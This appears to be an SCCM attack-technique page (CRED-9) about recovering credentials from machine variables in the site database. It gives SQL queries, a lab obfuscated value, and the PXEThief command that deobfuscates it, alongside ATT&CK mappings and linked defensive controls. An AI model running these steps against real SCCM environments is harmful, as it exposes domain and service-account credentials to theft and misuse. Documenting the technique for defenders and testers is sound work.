# CRED-9

## Description
Extract credentials stored as SCCM machine variables from the site database.

## MITRE ATT&CK TTPs
- [TA0006 - Credential Access](https://attack.mitre.org/tactics/TA0006)
- [T1555 - Credentials from Password Stores](https://attack.mitre.org/techniques/T1555/)
- [T1078.002 - Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/)

## Requirements
- Read access to the SCCM site database (for example, `db_datareader` on the site database).
- A copy of [PXEThief](https://github.com/MWR-CyberSec/PXEThief).

## Summary
SCCM supports per-device machine variables that are configured on a device's **Variables** tab and consumed by task sequences during operating-system deployment. Administrators may store sensitive values in these variables, including domain-join usernames and passwords, local administrator credentials, and service-account material.

The values are persisted in the site database's `MEP_MachineVariables` table. The relevant fields are `MachineID`, `Name`, `Value`, and `Masked`; values marked as secret are stored in SCCM's obfuscated credential-string format rather than as plaintext. This is the same self-contained obfuscation routine used by SCCM policy credentials. It is distinct from the RSA-encrypted blobs in `SC_UserAccount` described in [CRED-5](../CRED-5/cred-5_description.md), so the site-server private key used for CRED-5 is not required.

## Impact
An attacker with site-database read access can enumerate credential-bearing machine variables for devices in the hierarchy and deobfuscate their values offline. This can expose credentials that are not currently present on a client, including stale values retained in the database after a device or task-sequence configuration has changed. Reuse of a recovered domain or service account can enable lateral movement, privilege escalation, or further SCCM compromise.

## Defensive IDs
- [PREVENT-10: Enforce the principle of least privilege for accounts](../../../defense-techniques/PREVENT/PREVENT-10/prevent-10_description.md)
- [PREVENT-18: Use strong passwords for DBA accounts](../../../defense-techniques/PREVENT/PREVENT-18/prevent-18_description.md)
- [PREVENT-19: Remove unnecessary links to site databases](../../../defense-techniques/PREVENT/PREVENT-19/prevent-19_description.md)
- [PREVENT-20: Block unnecessary connections to site systems](../../../defense-techniques/PREVENT/PREVENT-20/prevent-20_description.md)
- [PREVENT-22: Do not manage assets in two or more segmented forests, domains, networks, or security tiers](../../../defense-techniques/PREVENT/PREVENT-22/prevent-22_description.md)

## Examples

### Query the site database

Use the site database name (`CM_<SITE_CODE>` in a default installation) appropriate to the environment.

```sql
SELECT MachineID, Name, Value, Masked
FROM dbo.MEP_MachineVariables;
```

Filter to secret values when the `Masked` column is populated as a Boolean in the environment:

```sql
SELECT MachineID, Name, Value, Masked
FROM dbo.MEP_MachineVariables
WHERE Masked = 1;
```

In a lab using site database `CM_PS1`, a test device returned the following dummy variable:

| MachineID | Name | Masked |
|---:|---|---|
| 16777226 | `CRED9_TEST` | `True` |

The corresponding `Value` was:

```text
891300008B4A8C47D91B93A94FCE11126197F5926D339E103646DA7E365FD91425A6749B832357DE57C1F66A1400000026000000280000000366000000000000AFB4E795D9D87DE81A52D8B6A2CB0E635DFC44C3F1F65D785AB1973D8ED16B51EF69F230646BF18F790000000000
```

### Deobfuscate a value

Copy the `Value` field exactly (including the `8913` header) and pass it to a compatible implementation. PXEThief's mode 7 is named for the DP `Reserved1` registry value, but its deobfuscation routine accepts the same credential-string format:

```text
python3 pxethief.py 7 "8913..."
```

For the lab value above, PXEThief produced:

```text
PXE Password: LabOnly-Secret123!
```

The complete command used was:

```text
python3 pxethief.py 7 "891300008B4A8C47D91B93A94FCE11126197F5926D339E103646DA7E365FD91425A6749B832357DE57C1F66A1400000026000000280000000366000000000000AFB4E795D9D87DE81A52D8B6A2CB0E635DFC44C3F1F65D785AB1973D8ED16B51EF69F230646BF18F790000000000"
```

A value may be stale, may be non-secret despite `Masked = 0`, or may use an algorithm unsupported by an older PXEThief version.

## References
- biskopp3n, BloodHound Slack thread, “Does anyone know how to decrypt machine variables from the MSSQL tables?” (13–21 March 2024).
- Christopher Panayi, [PXEThief](https://github.com/MWR-CyberSec/PXEThief).
- Adam Chester, [Exploring SCCM by Unobfuscating Network Access Accounts](https://blog.xpnsec.com/unobfuscating-network-access-accounts/).
